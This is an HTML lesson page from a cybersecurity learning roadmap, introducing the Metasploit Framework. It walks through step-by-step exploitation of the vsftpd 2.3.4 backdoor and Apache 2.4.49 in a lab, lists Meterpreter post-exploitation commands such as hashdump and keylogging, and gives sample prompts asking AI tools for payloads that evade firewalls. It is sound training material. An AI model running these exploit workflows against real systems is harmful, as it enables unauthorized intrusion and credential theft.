@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Day 41 \u2014 Intro to Metasploit Framework</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;600;700&family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
+<style>:root{--bg:#0a0e0f;--panel:#10171a;--edge:#1c2528;--green:#39ff88;--cyan:#4fd1ff;--amber:#ffb454;--red:#ff5c5c;--purple:#b389ff;--pink:#ff6bd6;--text:#e6edf0;--muted:#7d8590;}
+*{box-sizing:border-box;margin:0;padding:0;}
+body{background:var(--bg);color:var(--text);font-family:'Inter',sans-serif;line-height:1.65;background-image:radial-gradient(circle at 10% 0%,rgba(57,255,136,0.06),transparent 40%),radial-gradient(circle at 90% 10%,rgba(79,209,255,0.05),transparent 40%);}
+.wrap{max-width:900px;margin:0 auto;padding:40px 22px 100px;}
+.topbar{display:flex;justify-content:space-between;align-items:center;font-family:'IBM Plex Mono',monospace;font-size:12px;color:var(--muted);border-bottom:1px solid var(--edge);padding-bottom:14px;margin-bottom:30px;flex-wrap:wrap;gap:10px;}
+.pbar{width:120px;height:5px;background:var(--edge);border-radius:3px;overflow:hidden;}
+.pbar i{display:block;width:25.5%;height:100%;background:var(--green);}
+.day-tag{display:inline-flex;align-items:center;gap:8px;font-family:'IBM Plex Mono',monospace;color:var(--amber);font-size:13px;background:rgba(255,180,84,0.08);border:1px solid rgba(255,180,84,0.3);padding:5px 12px;border-radius:20px;margin-bottom:18px;}
+.day-tag::before{content:'\25cf';font-size:9px;}
+h1{font-family:'IBM Plex Mono',monospace;font-weight:700;font-size:clamp(26px,4.5vw,38px);line-height:1.2;margin-bottom:10px;}
+h1 .accent{color:var(--green);}
+.subtitle{color:var(--muted);font-size:15px;margin-bottom:30px;max-width:660px;}
+section{margin-bottom:34px;}
+.tag-pill{display:inline-flex;align-items:center;gap:8px;font-family:'IBM Plex Mono',monospace;font-size:12px;font-weight:700;text-transform:uppercase;letter-spacing:0.06em;padding:6px 14px;border-radius:20px;margin-bottom:16px;}
+.tag-pill.theory{background:rgba(79,209,255,0.1);color:var(--cyan);border:1px solid rgba(79,209,255,0.35);}
+.tag-pill.lab{background:rgba(57,255,136,0.1);color:var(--green);border:1px solid rgba(57,255,136,0.35);}
+.tag-pill.interview{background:rgba(179,137,255,0.1);color:var(--purple);border:1px solid rgba(179,137,255,0.35);}
+.tag-pill.biz{background:rgba(255,180,84,0.1);color:var(--amber);border:1px solid rgba(255,180,84,0.35);}
+.tag-pill.teach{background:rgba(255,92,92,0.1);color:var(--red);border:1px solid rgba(255,92,92,0.35);}
+.tag-pill.ai{background:rgba(255,107,214,0.1);color:var(--pink);border:1px solid rgba(255,107,214,0.35);}
+.tag-pill.job{background:rgba(57,255,136,0.1);color:var(--green);border:1px solid rgba(57,255,136,0.35);}
+p{font-size:14.5px;color:#cdd6da;margin-bottom:12px;}
+strong{color:var(--text);}
+code{background:#070a0b;border:1px solid var(--edge);border-radius:4px;padding:2px 6px;font-family:'IBM Plex Mono',monospace;font-size:12.5px;color:var(--green);}
+.card{background:var(--panel);border:1px solid var(--edge);border-radius:12px;padding:22px 24px;}
+.callout{background:rgba(79,209,255,0.05);border-left:3px solid var(--cyan);border-radius:0 8px 8px 0;padding:12px 16px;margin:12px 0;font-size:13.5px;color:#c5d5da;}
+.callout.amber{background:rgba(255,180,84,0.05);border-color:var(--amber);}
+.callout.red{background:rgba(255,92,92,0.05);border-color:var(--red);}
+.callout.green{background:rgba(57,255,136,0.05);border-color:var(--green);}
+.callout strong{color:var(--cyan);}
+.callout.amber strong{color:var(--amber);}
+.mindset-grid{display:flex;gap:14px;margin-top:14px;flex-wrap:wrap;}
+.mindset-col{flex:1;min-width:230px;border-radius:10px;padding:16px 18px;}
+.mindset-col.attacker{background:rgba(255,92,92,0.05);border:1px solid rgba(255,92,92,0.2);}
+.mindset-col.defender{background:rgba(57,255,136,0.05);border:1px solid rgba(57,255,136,0.2);}
+.mindset-col .role{font-family:'IBM Plex Mono',monospace;font-size:11px;text-transform:uppercase;margin-bottom:10px;font-weight:700;}
+.mindset-col.attacker .role{color:var(--red);}
+.mindset-col.defender .role{color:var(--green);}
+.mindset-col ul{padding-left:16px;font-size:13px;color:#cdd6da;}
+.mindset-col li{margin-bottom:6px;}
+.code-block{background:#070a0b;border:1px solid var(--edge);border-radius:8px;padding:14px 16px;font-family:'IBM Plex Mono',monospace;font-size:12.5px;overflow-x:auto;line-height:1.7;margin:10px 0;}
+.code-block .req{color:var(--green);}
+.code-block .hdr{color:var(--cyan);}
+.code-block .val{color:var(--amber);}
+.code-block .body{color:#8fa5ad;}
+.code-block .cmt{color:var(--muted);}
+.terminal{background:#070a0b;border:1px solid var(--edge);border-radius:10px;padding:0;margin-top:12px;overflow:hidden;}
+.term-chrome{display:flex;align-items:center;gap:8px;padding:9px 14px;background:#0e1517;border-bottom:1px solid var(--edge);}
+.term-body{padding:16px 18px;font-family:'IBM Plex Mono',monospace;font-size:12.5px;color:var(--green);overflow-x:auto;white-space:pre-wrap;line-height:1.75;}
+.term-body .c{color:var(--muted);}
+.term-body .out{color:#8fa5ad;}
+.term-body .cmd{color:var(--cyan);}
+.term-body .hi{color:var(--amber);}
+.lab-steps{list-style:none;counter-reset:step;margin-top:12px;}
+.lab-steps li{counter-increment:step;position:relative;padding-left:38px;margin-bottom:12px;font-size:14px;color:#cdd6da;}
+.lab-steps li::before{content:counter(step);position:absolute;left:0;top:0;width:24px;height:24px;border-radius:50%;background:var(--panel);border:1px solid var(--green);color:var(--green);font-family:'IBM Plex Mono',monospace;font-size:12px;font-weight:700;display:flex;align-items:center;justify-content:center;}
+.deliverable{margin-top:10px;background:rgba(255,180,84,0.06);border:1px solid rgba(255,180,84,0.25);border-radius:8px;padding:11px 15px;font-size:13px;color:var(--amber);}
+.interview-box{border-left:3px solid var(--purple);padding-left:16px;margin-top:12px;}
+.interview-box .q{font-weight:600;font-size:14px;margin-bottom:7px;color:var(--text);}
+.interview-box .a{font-size:13.5px;color:#b8c2c6;line-height:1.6;}
+.interview-box + .interview-box{margin-top:20px;}
+.ai-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(210px,1fr));gap:10px;margin-top:12px;}
+.ai-card{background:rgba(255,107,214,0.04);border:1px solid rgba(255,107,214,0.18);border-radius:10px;padding:14px;}
+.ai-card .aname{font-family:'IBM Plex Mono',monospace;font-weight:700;font-size:12.5px;color:var(--pink);margin-bottom:5px;}
+.ai-card .adesc{font-size:12px;color:var(--muted);}
+.job-card{background:rgba(57,255,136,0.04);border:1px solid rgba(57,255,136,0.15);border-radius:12px;padding:18px 20px;}
+.job-card .label{font-family:'IBM Plex Mono',monospace;color:var(--green);font-size:11px;text-transform:uppercase;letter-spacing:0.06em;margin-bottom:10px;}
+.job-card ul{padding-left:16px;font-size:13.5px;color:#cdd6da;}
+.job-card li{margin-bottom:8px;}
+.biz-card{background:linear-gradient(135deg,rgba(255,180,84,0.06),rgba(57,255,136,0.04));border:1px solid rgba(255,180,84,0.2);border-radius:12px;padding:18px 20px;}
+.teach-card{background:rgba(255,92,92,0.04);border:1px solid rgba(255,92,92,0.15);border-radius:12px;padding:18px 20px;}
+.res-grid{display:grid;gap:10px;margin-top:10px;}
+.res-card{display:flex;gap:12px;align-items:flex-start;background:var(--panel);border:1px solid var(--edge);border-radius:10px;padding:14px 16px;text-decoration:none;color:var(--text);transition:border-color .2s;}
+.res-card:hover{border-color:var(--cyan);}
+.res-icon{font-family:'IBM Plex Mono',monospace;font-size:10px;color:var(--bg);border-radius:5px;padding:3px 8px;flex-shrink:0;margin-top:2px;font-weight:700;}
+.res-icon.en{background:var(--red);}
+.res-icon.hi{background:var(--amber);}
+.res-icon.lab{background:var(--green);}
+.res-title{font-weight:600;font-size:13.5px;}
+.res-desc{font-size:12px;color:var(--muted);margin-top:2px;}
+.mistakes-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(210px,1fr));gap:8px;margin-top:12px;}
+.mistake-item{display:flex;align-items:flex-start;gap:8px;background:var(--bg);border:1px solid var(--edge);border-radius:8px;padding:9px 11px;font-size:12.5px;color:#b8c2c6;}
+.mistake-item .check{color:var(--green);font-weight:700;flex-shrink:0;}
+.checklist{list-style:none;}
+.checklist li{display:flex;align-items:flex-start;gap:10px;padding:9px 0;border-bottom:1px solid var(--edge);font-size:14px;color:#cdd6da;}
+.checklist li:last-child{border-bottom:none;}
+.checklist .box{width:17px;height:17px;border:1.5px solid var(--green);border-radius:4px;flex-shrink:0;margin-top:2px;}
+.stamp-wrap{display:flex;justify-content:center;margin:44px 0 28px;}
+.stamp{border:3px solid var(--green);border-radius:50%;width:155px;height:155px;display:flex;flex-direction:column;align-items:center;justify-content:center;transform:rotate(-8deg);color:var(--green);font-family:'IBM Plex Mono',monospace;text-transform:uppercase;box-shadow:0 0 28px rgba(57,255,136,0.12);}
+.stamp .l1{font-size:10px;letter-spacing:0.1em;}
+.stamp .l2{font-size:22px;font-weight:700;margin:4px 0;}
+.stamp .l3{font-size:10px;letter-spacing:0.1em;}
+.next-up{background:linear-gradient(135deg,rgba(57,255,136,0.05),rgba(79,209,255,0.03));border:1px solid var(--edge);border-radius:12px;padding:20px 24px;display:flex;justify-content:space-between;align-items:center;gap:16px;flex-wrap:wrap;}
+.next-up .label{font-family:'IBM Plex Mono',monospace;font-size:11px;color:var(--muted);margin-bottom:4px;}
+.next-up .title{font-weight:700;font-size:16px;}
+.next-up .arrow{font-family:'IBM Plex Mono',monospace;color:var(--cyan);font-size:24px;}
+footer{margin-top:28px;text-align:center;color:var(--muted);font-size:12px;font-family:'IBM Plex Mono',monospace;}
+@media(max-width:600px){.wrap{padding:26px 14px 70px;}}</style>
+</head>
+<body>
+<div class="wrap">
+  <div class="topbar">
+    <span>robin@gcek-it:~/roadmap/day41$ cat metasploit.md</span>
+    <div style="display:flex;align-items:center;gap:6px;">Day 41/90 \u2014 Phase 3 <div class="pbar"><i></i></div></div>
+  </div>
+  <div class="day-tag">DAY 41 OF 90 -- PHASE 3: OFFENSIVE SECURITY & TOOLS</div>
+  <h1>Intro to Metasploit Framework <span class="accent"></span></h1>
+  <p class="subtitle">Metasploit is the most widely used exploitation framework in the world.</p>
+  <section><span class="tag-pill theory">THEORY</span><div class="card">
+<p><strong>Metasploit architecture:</strong> msfconsole (CLI), modules (exploit, payload, auxiliary, post, encoder), database (stores results, creds, loot). Exploit delivers the attack. Payload defines post-exploitation behavior. Auxiliary does scanning/enum. Post does privesc/extraction.</p>
+<div class="code-block">
+<span class="req">msfconsole</span>
+<span class="req">search type:exploit platform:linux apache 2.4.49</span>
+<span class="req">use exploit/multi/http/apache_normalize_path</span>
+<span class="req">show options</span>
+<span class="req">set RHOSTS 10.10.10.1</span>
+<span class="req">set LHOST 10.10.10.50</span>
+<span class="req">check         # Verify target vulnerable</span>
+<span class="req">exploit       # Run the exploit</span></div>
+<p><strong>Payloads:</strong> Staged (small stager + larger payload, stealthy) vs Inline (single payload, reliable). Meterpreter: in-memory post-exploitation agent supporting sysinfo, hashdump, screenshot, keylogging.</p>
+<div class="callout"><strong>Key insight:</strong> Metasploit is a pentesting framework, not a hacking tool. Always run check before exploit. Running exploits without understanding them is dangerous.</div></div></section>
+  <section>
+    <div style="font-family:'IBM Plex Mono',monospace;font-size:12px;color:var(--cyan);text-transform:uppercase;letter-spacing:0.06em;margin-bottom:14px;">// attacker vs defender mindset</div>
+    <div class="mindset-grid">
+      <div class="mindset-col attacker">
+        <div class="role">ATTACKER</div>
+        <ul><li>Search methodically: search type:exploit platform:linux cve:2021. Filter by type, platform, CVE year.</li><li>Always run check before exploit. Verifies target is vulnerable without launching destructive attack.</li><li>Use Meterpreter: sysinfo, getuid, hashdump, screenshot, keyscan_start. Runs in memory (no disk writes).</li><li>Set up multi/handler for receiving shells from exploits run outside msfconsole.</li></ul>
+      </div>
+      <div class="mindset-col defender">
+        <div class="role">DEFENDER</div>
+        <ul><li>Keep Metasploit updated -- defenders use it too. msfupdate regularly.</li><li>Monitor for Meterpreter traffic: reverse HTTPS on unusual ports, staged payload connections, beaconing.</li><li>Use Windows Defender ASR rules to block common Metasploit behaviors like LSASS dumping.</li><li>Run Metasploit's auxiliary/scanner/* modules against your own network.</li></ul>
+      </div>
+    </div>
+  </section>
+  <section><div style="font-family:'IBM Plex Mono',monospace;font-size:12px;color:var(--cyan);text-transform:uppercase;letter-spacing:0.06em;margin-bottom:14px;">// real named incident</div><div class="breach-card" style="background:rgba(255,92,92,0.04);border:1px solid rgba(255,92,92,0.2);border-radius:12px;padding:18px 20px;"><div class="year" style="font-family:'IBM Plex Mono',monospace;font-size:11px;color:var(--red);margin-bottom:5px;">2017 -- EQUIFAX BREACH -- 147 MILLION RECORDS</div><div class="name" style="font-weight:700;font-size:15px;margin-bottom:7px;">Attackers used public Metasploit modules for Apache Struts CVE-2017-5638.</div><div class="detail" style="font-size:13px;color:#b8c2c6;line-height:1.6;">Equifax's dispute portal ran Apache Struts with CVE-2017-5638, a Jakarta Multipart parser RCE. Public Metasploit modules were available within days of disclosure. Attackers used one to gain initial access and moved laterally for 76 days. 147M names, SSNs, birth dates exposed. Stock dropped 35%, CEO resigned, $1.4B in settlements. The exploit was in msfconsole for months -- Equifax simply hadn't patched.</div></div></section>
+  <section><span class="tag-pill lab">HANDS-ON LAB</span><div class="card"><p><strong>Goal:</strong> Launch msfconsole: sudo msfconsole -q. Wait for DB connection....</p><ol class="lab-steps"><li>Launch msfconsole: sudo msfconsole -q. Wait for DB connection.</li><li>Search vsftpd: search vsftpd 2.3.4. Note module path.</li><li>Use exploit: use exploit/unix/ftp/vsftpd_234_backdoor. Show options.</li><li>Set RHOSTS to Metasploitable 2 IP, LHOST to your IP.</li><li>Run check, then exploit. You should get a shell.</li><li>In shell: id; whoami; uname -a. Background with 'background'. Sessions: sessions -l.</li></ol><div class="deliverable"><strong>Deliverable:</strong> Screenshot of successful exploit showing shell access with search-configure-exploit workflow documented.</div></div></section>
+  <div class="terminal"><div class="term-chrome"><div class="term-dot" style="background:#ff5f56;"></div><div class="term-dot" style="background:#ffbd2e;"></div><div class="term-dot" style="background:#27c93f;"></div></div><div class="term-body"><span class="c"># Launch Metasploit</span>
+<span class="cmd">sudo msfconsole -q</span>
+
+<span class="c"># Search and configure</span>
+<span class="cmd">msf6> search vsftpd 2.3.4</span>
+<span class="out">exploit/unix/ftp/vsftpd_234_backdoor</span>
+<span class="cmd">msf6> use exploit/unix/ftp/vsftpd_234_backdoor</span>
+<span class="cmd">msf6> set RHOSTS 10.10.10.1</span>
+<span class="cmd">msf6> set LHOST 10.10.10.50</span>
+<span class="cmd">msf6> check</span>
+<span class="out">[*] Target appears vulnerable</span>
+<span class="cmd">msf6> exploit</span>
+
+<span class="c"># Meterpreter post-exploitation</span>
+<span class="cmd">meterpreter> sysinfo && getuid</span>
+<span class="cmd">meterpreter> shell</span>
+<span class="cmd">meterpreter> background</span>
+<span class="cmd">msf6> sessions -l && sessions -i 1</span></div></div>
+  <section><span class="tag-pill interview">INTERVIEW READY</span><div class="card"><div class="interview-box"><div class="q">Q: "Walk me through Metasploit exploitation."</div><div class="a">A: "Launch msfconsole, search for exploit (search vsftpd 2.3.4), select with use, configure RHOSTS/LHOST, run check to verify vulnerable, then exploit. If successful, interact via Meterpreter for post-exploit or drop to shell. Always check before exploit to avoid crashes."</div></div><div class="interview-box"><div class="q">Q: "Staged vs inline payloads?"</div><div class="a">A: "Staged (windows/meterpreter/reverse_tcp): small stager downloads larger payload. Smaller, stealthier, needs connect-back. Inline (windows/shell_reverse_tcp): entire payload in one package. More reliable but larger. Staged for size restrictions; inline for unstable connections."</div></div><div class="interview-box"><div class="q">Q: "What is Meterpreter?"</div><div class="a">A: "Metasploit's in-memory payload (no disk writes, harder to detect). Capabilities: sysinfo, getuid, hashdump, screenshot, keyscan, shell, upload/download, getsystem (privesc). Encrypted channels, loadable extensions."</div></div></div></section>
+  <section><span class="tag-pill ai">AI TOOLS</span><div class="ai-grid"><div class="ai-card"><div class="aname">MSF command assistant</div><div class="adesc">Describe target: 'I have Windows 10 on port 445 -- what msfconsole commands?'</div></div><div class="ai-card"><div class="aname">Payload selector</div><div class="adesc">'Reverse shell for Linux x64 with firewall evasion -- what options?'</div></div><div class="ai-card"><div class="aname">Searchsploit to MSF mapper</div><div class="adesc">'Found Apache 2.4.49 with searchsploit -- what's the Metasploit module?'</div></div><div class="ai-card"><div class="aname">Post-exploit checklist</div><div class="adesc">'What commands first after shell on Linux server?'</div></div></div></section>
+  <section><span class="tag-pill job">HOW THIS GETS YOU PLACED</span><div class="job-card"><div class="label">// placement & resume angles</div><ul><li><strong>Resume bullet:</strong> "Used Metasploit Framework for exploitation including module selection, payload config, and Meterpreter post-exploitation."</li><li><strong>Portfolio piece:</strong> documented exploit workflow -- search, select, configure, check, exploit, post -- with screenshots against a vulnerable VM.</li><li><strong>Talking point:</strong> running check before exploit shows professional responsibility and understanding that Metasploit can crash services.</li></ul></div></section>
+  <section><span class="tag-pill biz">ENTREPRENEUR ANGLE</span><div class="biz-card"><p>Metasploit expertise bills at premium rates. Most SOC analysts know Metasploit exists; few can explain architecture, payload types, post-exploitation. A 'Metasploit for Defenders' workshop ($2k-4k/session) teaches blue teams to detect Metasploit techniques: payload delivery, Meterpreter traffic, privesc modules.</p></div></section>
+  <section><span class="tag-pill teach">TEACH IT BACK</span><div class="teach-card"><p style="margin-bottom:0;">Explain in 90 seconds: "What is Metasploit, 3 module types, and workflow from search to shell?" Exploit, payload, auxiliary. Trace: search > use > set > check > exploit > post.</p></div></section>
+  <section><div style="font-family:'IBM Plex Mono',monospace;font-size:12px;color:var(--cyan);text-transform:uppercase;letter-spacing:0.06em;margin-bottom:12px;">// watch</div><div class="res-grid"><a class="res-card" href="https://www.youtube.com/watch?v=8lR27i8M1iY" target="_blank"><span class="res-icon en">EN</span><div><div class="res-title">Metasploit for Beginners -- The Cyber Mentor</div><div class="res-desc">Complete intro to msfconsole, modules, Meterpreter.</div></div></a><a class="res-card" href="https://www.youtube.com/watch?v=O2J8v2YydbM" target="_blank"><span class="res-icon hi">HI</span><div><div class="res-title">Metasploit Full Hindi -- Technical Sagar</div><div class="res-desc">Hindi walkthrough of Metasploit architecture and exploitation.</div></div></a><a class="res-card" href="https://www.offensive-security.com/metasploit-unleashed/" target="_blank"><span class="res-icon lab">LAB</span><div><div class="res-title">Metasploit Unleashed -- free course</div><div class="res-desc">Comprehensive free Metasploit training from OffSec.</div></div></a><a class="res-card" href="https://tryhackme.com/room/metasploitintro" target="_blank"><span class="res-icon lab">LAB</span><div><div class="res-title">TryHackMe Metasploit Intro</div><div class="res-desc">Free hands-on Metasploit module with practice exercises.</div></div></a></div></section>
+  <section>
+    <div style="font-family:'IBM Plex Mono',monospace;font-size:12px;color:var(--cyan);text-transform:uppercase;letter-spacing:0.06em;margin-bottom:12px;">// mistakes avoided today</div>
+    <div class="mistakes-grid"><div class="mistake-item"><span class="check">CHECK</span> Metasploit architecture, not just 'launch and exploit.'</div><div class="mistake-item"><span class="check">CHECK</span> Exploit vs payload vs auxiliary clearly distinguished.</div><div class="mistake-item"><span class="check">CHECK</span> Staged vs inline payloads with use cases.</div><div class="mistake-item"><span class="check">CHECK</span> Real Equifax breach: MSF modules for Struts available before attack.</div><div class="mistake-item"><span class="check">CHECK</span> Meterpreter post-exploit: sysinfo, hashdump, screenshot, keyscan.</div><div class="mistake-item"><span class="check">CHECK</span> check before exploit emphasized as professional responsibility.</div></div>
+  </section>
+  <section>
+    <div class="card">
+      <ul class="checklist"><li><span class="box"></span> I launched msfconsole and know basic commands.</li><li><span class="box"></span> I searched for and selected an exploit module.</li><li><span class="box"></span> I configured RHOSTS and LHOST.</li><li><span class="box"></span> I ran check and exploit against a target.</li><li><span class="box"></span> I used Meterpreter for post-exploitation.</li><li><span class="box"></span> I understand staged vs inline payloads.</li><li><span class="box"></span> I can explain Metasploit architecture.</li></ul>
+    </div>
+  </section>
+  <div class="stamp-wrap">
+    <div class="stamp"><div class="l1">Day Complete</div><div class="l2">41 / 90</div><div class="l3">Verified</div></div>
+  </div>
+  <div class="next-up">
+    <div>
+      <div class="label">tomorrow \u2014 day 42</div>
+      <div class="title">Exploiting a Vulnerable VM</div>
+    </div>
+    <div class="arrow">\u2192</div>
+  </div>
+  <footer>say "Day 42" when ready \u2014 one concept, one hour, one day at a time.</footer>
+</div>
+</body>
+</html>
